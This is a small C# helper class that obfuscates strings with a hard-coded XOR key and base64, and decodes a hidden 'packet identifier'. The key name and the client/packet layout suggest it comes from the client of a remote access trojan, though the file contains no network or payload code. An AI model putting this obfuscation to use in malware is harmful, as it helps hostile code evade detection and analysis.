using System;
using System.Text;

namespace Client.Helper
{
    public static class StringProtection
    {
        private static readonly byte[] XorKey = Encoding.UTF8.GetBytes("XyaRat2025SecureKey");

        public static string Decrypt(string encrypted)
        {
            try
            {
                byte[] data = Convert.FromBase64String(encrypted);
                byte[] result = new byte[data.Length];
                
                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ XorKey[i % XorKey.Length]);
                }
                
                return Encoding.UTF8.GetString(result);
            }
            catch
            {
                return encrypted;
            }
        }

        public static string Encrypt(string plainText)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(plainText);
                byte[] result = new byte[data.Length];
                
                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ XorKey[i % XorKey.Length]);
                }
                
                return Convert.ToBase64String(result);
            }
            catch
            {
                return plainText;
            }
        }

        public static string GetPacketIdentifier()
        {
            return Decrypt("Gx4YCxYdCQ==");
        }
    }
}
